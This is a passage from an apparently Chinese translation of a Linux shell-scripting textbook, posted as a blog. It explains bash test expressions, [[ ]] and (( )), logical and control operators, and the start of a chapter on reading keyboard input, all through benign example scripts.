<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">test_file</span></span> () &#123;</span><br><span class="line"><span class="comment"># test-file: 评估文件的状态</span></span><br><span class="line">FILE=~/.bashrc</span><br><span class="line"><span class="keyword">if</span> [ -e <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是一个常规文件。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -d <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是一个目录。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是可读的。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -w <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是可写的。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$FILE</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 是可执行/可搜索的。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 不存在&quot;</span></span><br><span class="line">  <span class="built_in">return</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="字符串表达式"><a href="#字符串表达式" class="headerlink" title="字符串表达式"></a>字符串表达式</h4><p>表27-2列出了用于评估字符串的表达式：</p>
<p><em>表27-2:</em> <em>test字符串表达式</em></p>
<table>
<thead>
<tr>
<th><strong>表达式</strong></th>
<th><strong>为真如果…</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>string</em></td>
<td><em>string</em>不为空。</td>
</tr>
<tr>
<td>-n <em>string</em></td>
<td><em>string</em>的长度大于零。</td>
</tr>
<tr>
<td>-z <em>string</em></td>
<td><em>string</em>的长度为零。</td>
</tr>
<tr>
<td><em>string1</em> &#x3D; <em>string2 string1 &#x3D;&#x3D; string2</em></td>
<td><em>string1</em>和<em>string2</em>相等。可以使用单个或双等号。使用双等号由bash支持并且通常是首选，但它不符合POSIX标准。</td>
</tr>
<tr>
<td><em>string1</em> !&#x3D; <em>string2</em></td>
<td><em>string1</em>和<em>string2</em>不相等。</td>
</tr>
<tr>
<td><em>string1</em> &gt; <em>string2</em></td>
<td><em>string1</em>在排序上位于<em>string2</em>之后。</td>
</tr>
<tr>
<td><em>string1</em> &lt; <em>string2</em></td>
<td><em>string1</em>在排序上位于<em>string2</em>之前。</td>
</tr>
</tbody></table>
<p><strong>警告</strong>：当使用test时，&gt;和&lt;表达式操作符必须被引号引起来（或用反斜杠转义）。如果没有，它们将被shell解释为重定向操作符，可能会产生具有破坏性的结果。另外请注意，虽然bash文档称排序顺序符合当前区域设置的排序顺序，但实际上并不是。在bash的4.0及以下版本中使用的是ASCII（POSIX）顺序。这个问题在4.1版本中得到修复。</p>
<p>这是一个包含字符串表达式的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-string: 评估字符串的值</span></span><br><span class="line">ANSWER=maybe</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$ANSWER</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;没有答案。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$ANSWER</span>&quot;</span> = <span class="string">&quot;yes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;答案是YES。&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$ANSWER</span>&quot;</span> = <span class="string">&quot;no&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;答案是NO。&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$ANSWER</span>&quot;</span> = <span class="string">&quot;maybe&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;答案是MAYBE。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;答案是UNKNOWN。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，我们评估常量ANSWER。我们首先确定字符串是否为空。如果是，我们终止脚本并将退出状态设置为1。注意应用于echo命令的重定向。这将错误消息“没有答案。”重定向到标准错误，这是对错误消息应该做的处理。如果字符串不为空，我们评估字符串的值，看它是否等于“yes”、“no”或“maybe”。我们通过使用elif来做到这一点，它是“else if”的缩写。通过使用elif，我们能够构造更复杂的逻辑测试。</p>
<h4 id="整数表达式"><a href="#整数表达式" class="headerlink" title="整数表达式"></a>整数表达式</h4><p>为了将值作为整数而不是字符串进行比较，我们可以使用表27-3中列出的表达式。</p>
<p><em>表27-3:</em> <em>test整数表达式</em></p>
<table>
<thead>
<tr>
<th><strong>表达式</strong></th>
<th><strong>为真如果…</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>integer1</em> -eq <em>integer2</em></td>
<td><em>integer1</em>等于<em>integer2</em>。</td>
</tr>
<tr>
<td><em>integer1</em> -ne <em>integer2</em></td>
<td><em>integer1</em>不等于<em>integer2</em>。</td>
</tr>
<tr>
<td><em>integer1</em> -le <em>integer2</em></td>
<td><em>integer1</em>小于或等于<em>integer2</em>。</td>
</tr>
<tr>
<td><em>integer1</em> -lt <em>integer2</em></td>
<td><em>integer1</em>小于<em>integer2</em>。</td>
</tr>
<tr>
<td><em>integer1</em> -ge <em>integer2</em></td>
<td><em>integer1</em>大于或等于<em>integer2</em>。</td>
</tr>
<tr>
<td><em>integer1</em> -gt <em>integer2</em></td>
<td><em>integer1</em>大于<em>integer2</em>。</td>
</tr>
</tbody></table>
<p>这是一个演示它们的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-integer: 评估一个整数的值。</span></span><br><span class="line">INT=-5</span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;INT为空。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;INT为零。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -lt 0 ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT为负。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT为正。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">if</span> [ $((INT % <span class="number">2</span>)) -eq 0 ];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT为偶数。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT为奇数。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>脚本有趣的部分是它如何确定一个整数是偶数还是奇数。通过对数字进行模2操作，将数字除以2并返回余数，它可以告诉数字是奇数还是偶数。</p>
<h4 id="test的更现代版本"><a href="#test的更现代版本" class="headerlink" title="test的更现代版本"></a><strong>test的更现代版本</strong></h4><p>现代版本的bash包括一个作为test的增强替代品的复合命令。它使用以下语法：</p>
<blockquote>
<p>[[ <em>expression</em> ]]</p>
</blockquote>
<p>其中，像test一样，<em>expression</em>是一个评估为真或假结果的表达式。[[ ]]命令类似于test（它支持所有的表达式），但增加了一个重要的新字符串表达式。</p>
<blockquote>
<p><em>string1</em> &#x3D;~ <em>regex</em></p>
</blockquote>
<p>如果<em>string1</em>与扩展正则表达式<em>regex</em>匹配，则返回真。这为执行数据验证等任务打开了很多可能性。在我们早期的整数表达式示例中，如果常量INT包含除整数之外的任何内容，脚本将失败。脚本需要一种方法来验证常量是否包含一个整数。使用[[ ]]和&#x3D;~字符串表达式运算符，我们可以这样改进脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-integer2: 评估一个整数的值。</span></span><br><span class="line">INT=-5</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> =~ ^-?[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT为零。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -lt 0 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;INT为负。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;INT为正。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ $((INT % <span class="number">2</span>)) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;INT为偶数。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;INT为奇数。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;INT不是一个整数。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>通过应用正则表达式，我们能够将INT的值限制为仅以一个可选的减号开头，后跟一个或多个数字的字符串。这个表达式还消除了空值的可能性。</p>
<p>[[ ]]的另一个新增特性是&#x3D;&#x3D;运算符支持模式匹配，就像路径名展开一样。这是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ FILE=foo.bar</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> [[ <span class="variable">$FILE</span> == foo.* ]]; <span class="keyword">then</span></span><br><span class="line">&gt; <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$FILE</span> 匹配模式 &#x27;foo.*&#x27;&quot;</span></span><br><span class="line">&gt; <span class="keyword">fi</span></span><br><span class="line">foo.bar 匹配模式 <span class="string">&#x27;foo.*&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这使得[[ ]]对于评估文件和路径名很有用。</p>
<h4 id="为整数设计"><a href="#为整数设计" class="headerlink" title="(( )) - 为整数设计"></a><strong>(( )) - 为整数设计</strong></h4><p>除了[[ ]]复合命令外，bash还提供了(( ))复合命令，它对于操作整数很有用。它支持一整套算术评估，我们将在第34章“字符串和数字”中全面介绍。</p>
<p>(( ))用于执行<em>算术真值测试</em>。如果算术评估的结果非零，则算术真值测试结果为真。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> ((<span class="number">1</span>)); <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;它是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">它是真的。</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> ((<span class="number">0</span>)); <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;它是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">[me@linuxbox ~]$ </span><br></pre></td></tr></table></figure>

<p>使用(( ))，我们可以稍微简化test-integer2脚本，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-integer2a: 评估一个整数的值。</span></span><br><span class="line">INT=-5</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> =~ ^-?[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> ((INT == <span class="number">0</span>)); <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT为零。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> ((INT &lt; <span class="number">0</span>)); <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT为负。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT为正。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> (( ((INT % <span class="number">2</span>)) == 0)); <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT为偶数。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INT为奇数。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;INT不是一个整数。&quot;</span> &gt;&amp;2</span><br><span class="line">  <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>注意我们使用了小于和大于符号，&#x3D;&#x3D;用于测试等价性。这是处理整数的更自然的语法。还请注意，因为复合命令(( ))是shell语法的一部分，而不是普通命令，并且它只处理整数，它能够通过名称识别变量，不需要执行展开。我们将在第34章进一步讨论(( ))和相关的算术展开。</p>
<h4 id="组合表达式"><a href="#组合表达式" class="headerlink" title="组合表达式"></a><strong>组合表达式</strong></h4><p>也可以组合表达式以创建更复杂的评估。表达式通过使用逻辑运算符组合。我们在第17章“搜索文件”中看到了这些，当时我们学习了find命令。对于test和[[ ]]，有三种逻辑操作。它们是AND、OR和NOT。test和[[ ]]使用不同的运算符来表示这些操作：</p>
<p><em>表27-4: 逻辑运算符</em></p>
<table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>test</strong></th>
<th><strong>[[ ]] 和</strong> <strong>(( ))</strong></th>
</tr>
</thead>
<tbody><tr>
<td>AND</td>
<td>-a</td>
<td>&amp;&amp;</td>
</tr>
<tr>
<td>OR</td>
<td>-o</td>
<td>||</td>
</tr>
<tr>
<td>NOT</td>
<td>!</td>
<td>!</td>
</tr>
</tbody></table>
<p>这是一个AND操作的示例。以下脚本确定一个整数是否在一定范围内：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-integer3: 确定一个整数是否在指定范围内。</span></span><br><span class="line">MIN_VAL=1</span><br><span class="line">MAX_VAL=100</span><br><span class="line">INT=50</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> =~ ^-?[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$MIN_VAL</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$MAX_VAL</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">	  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 在 <span class="variable">$MIN_VAL</span> 到 <span class="variable">$MAX_VAL</span> 范围内。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 超出范围。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;INT 不是一个整数。&quot;</span> &gt;&amp;2</span><br><span class="line"> <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，我们确定整数INT的值是否在MIN_VAL和MAX_VAL的值之间。这是通过单次使用[[ ]]完成的，其中包括两个由&amp;&amp;运算符分隔的表达式。我们也可以使用test来编码这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$MIN_VAL</span>&quot;</span> -a <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$MAX_VAL</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 在 <span class="variable">$MIN_VAL</span> 到 <span class="variable">$MAX_VAL</span> 范围内。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 超出范围。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>!取反运算符反转表达式的结果。如果表达式为假，则返回真；如果表达式为真，则返回假。在下一个脚本中，我们修改了评估逻辑，以找到处于指定范围外的INT值：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-integer4: 确定一个整数是否在指定范围外。</span></span><br><span class="line">MIN_VAL=1</span><br><span class="line">MAX_VAL=100</span><br><span class="line">INT=50</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> =~ ^-?[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [[ ! (<span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$MIN_VAL</span>&quot;</span> &amp;&amp; <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$MAX_VAL</span>&quot;</span>) ]]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 在 <span class="variable">$MIN_VAL</span> 到 <span class="variable">$MAX_VAL</span> 范围外。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 在范围内。&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;INT 不是一个整数。&quot;</span> &gt;&amp;2</span><br><span class="line"> <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>我们还在表达式周围包括了括号，用于分组。如果不包括这些，取反将只应用于第一个表达式，而不是两个表达式的组合。使用test进行编码的方式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ ! \( <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$MIN_VAL</span>&quot;</span> -a <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$MAX_VAL</span>&quot;</span> \) ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 在 <span class="variable">$MIN_VAL</span> 到 <span class="variable">$MAX_VAL</span> 范围外。&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$INT</span> 在范围内。&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>由于test使用的所有表达式和运算符都被shell视为命令参数（不像[[ ]]和(( ))），对bash有特殊含义的字符，如&lt;、&gt;、(和)，必须被引号引起来或转义。</p>
<p>鉴于test和[[ ]]大致做相同的事情，哪个更可取？test是传统的（并且是POSIX标准shell的一部分，这些shell通常用于运行系统启动脚本），而[[ ]]是特定于bash的（以及其他一些现代shell）。了解如何使用test很重要，因为它被广泛使用，但</p>
<p>[[ ]]显然更有用，编码也更容易，因此它是现代脚本的首选。</p>
<h4 id="可移植性是小心思的妖怪"><a href="#可移植性是小心思的妖怪" class="headerlink" title="可移植性是小心思的妖怪"></a><strong>可移植性是小心思的妖怪</strong></h4><p>如果你和“真正”的Unix人交谈，你很快会发现他们中的许多人不怎么喜欢Linux。他们认为它不纯洁、不干净。Unix用户的一个信条是一切都应该是“可移植的”。这意味着你写的任何脚本都应该能够在任何类Unix系统上不加修改地运行。</p>
<p>Unix用户有充分的理由这样认为。看到命令和shell的专有扩展在POSIX之前对Unix世界做了什么，他们自然会对Linux对他们心爱的操作系统的影响保持警惕。</p>
<p>但可移植性有一个严重的缺点。它阻碍了进步。它要求事情总是使用“最小公分母”技术来完成。在shell编程的情况下，这意味着使一切与sh，原始的Bourne shell兼容。</p>
<p>专有软件供应商使用这个缺点作为借口来证明他们的专有扩展，只是他们称之为“创新”。但它们实际上只是锁定他们客户的设备。</p>
<p>GNU工具，如bash，没有这样的限制。它们通过支持标准并且在几乎任何类型的系统上都可以无成本安装来鼓励可移植性，甚至包括Windows。所以请随意使用bash的所有功能。它是<em>真正</em>可移植的。</p>
<h4 id="控制运算符：另一种分支方式"><a href="#控制运算符：另一种分支方式" class="headerlink" title="控制运算符：另一种分支方式"></a><strong>控制运算符：另一种分支方式</strong></h4><p>bash提供了两个可以执行分支的控制运算符。&amp;&amp;（AND）和||（OR）运算符的工作方式类似于[[ ]]复合命令中的逻辑运算符。</p>
<blockquote>
<p>这是&amp;&amp;的语法：<em>command1</em> &amp;&amp; <em>command2</em><br>以及这是||的语法：<em>command1</em> || <em>command2</em></p>
</blockquote>
<p>重要的是要理解这些的行为。使用&amp;&amp;运算符，<em>command1</em>被执行，<em>command2</em>被执行如果<em>且仅当</em>，<em>command1</em>成功。使用||运算符，<em>command1</em>被执行，<em>command2</em>被执行如果<em>且仅当</em>，<em>command1</em>不成功。</p>
<p>实际上，这意味着我们可以做这样的事情：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">mkdir</span> temp &amp;&amp; <span class="built_in">cd</span> temp</span><br></pre></td></tr></table></figure>

<p>这将创建一个名为temp的目录，如果成功，将把当前工作目录更改为temp。只有当mkdir命令成功时才尝试第二个命令。同样，像这样的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ [[ -d temp ]] || <span class="built_in">mkdir</span> temp</span><br></pre></td></tr></table></figure>

<p>将测试temp目录是否存在，只有当测试失败时才创建目录。这种结构很适合在脚本中处理错误，我们将在后面的章节中更多地讨论这个话题。例如，我们可以在脚本中这样做：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ -d temp ] || <span class="built_in">exit</span> 1</span><br></pre></td></tr></table></figure>

<p>如果脚本需要temp目录而它不存在，那么脚本将以退出状态1终止。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>我们从一个问题开始这一章。我们如何使我们的sys_info_page脚本检测用户是否有权限读取所有家目录？有了if的知识，我们可以通过向report_home_space函数添加这段代码来解决问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">report_home_space</span></span> () &#123;</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;<span class="subst">$(id -u)</span>&quot;</span> -eq 0 ]]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_</span></span><br><span class="line"><span class="string">      &lt;h2&gt;Home Space Utilization (All Users)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;pre&gt;$(du -sh /home/*)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">      _EOF_</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cat</span> &lt;&lt;- <span class="string">_EOF_ </span></span><br><span class="line"><span class="string">      &lt;h2&gt;Home Space Utilization ($USER)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">      &lt;pre&gt;$(du -sh $HOME)&lt;/pre&gt;</span></span><br><span class="line"><span class="string">      _EOF_</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="built_in">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将评估 id 命令的输出。使用 -u 选项时，id 输出有效用户的数字用户 ID 号。超级用户始终是 ID 零，而其他用户的数字都大于零。知道这一点，我们可以构造两个不同的 here 文档，一个利用超级用户权限，另一个限制在用户自己的主目录中。</p>
<p>我们将暂时离开 sys_info_page 程序，但不用担心。我们会回来的。与此同时，我们将覆盖一些在我们恢复工作时需要的主题。</p>
<h4 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a><strong>进一步阅读</strong></h4><p>bash 手册页的几个部分提供了对本章覆盖主题的进一步详细信息：</p>
<ul>
<li><p>列表（涵盖控制操作符 || 和 &amp;&amp;）</p>
</li>
<li><p>复合命令（涵盖 [[ ]]、(( )) 和 if）</p>
</li>
<li><p>条件表达式</p>
</li>
</ul>
<!---->

<ul>
<li>SHELL 内置命令（涵盖 test）</li>
</ul>
<p>此外，维基百科有一篇关于伪代码概念的好文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9Qc2V1ZG9jb2Rl">http://en.wikipedia.org/wiki/Pseudocode<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>TLCL</tag>
      </tags>
  </entry>
  <entry>
    <title>读取键盘输入</title>
    <url>/2024/05/28-reading-keyboard-input/</url>
    <content><![CDATA[<h2 id="28-读取键盘输入"><a href="#28-读取键盘输入" class="headerlink" title="28 - 读取键盘输入"></a>28 - 读取键盘输入</h2><p>我们迄今为止编写的脚本缺少大多数计算机程序中常见的一个功能——<em>交互性</em>，即程序与用户互动的能力。虽然许多程序不需要交互性，但有些程序能够直接从用户那里接收输入将更有用。以前一章中的这个脚本为例：</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># test-integer2: 评估一个整数的值。</span></span><br><span class="line">INT=-5</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> =~ ^-?[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">echo</span> <span class="string">&quot;INT 是零。&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$INT</span>&quot;</span> -lt 0 ]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT 是负数。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT 是正数。&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">if</span> [ $((INT % <span class="number">2</span>)) -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT 是偶数。&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	<span class="built_in">echo</span> <span class="string">&quot;INT 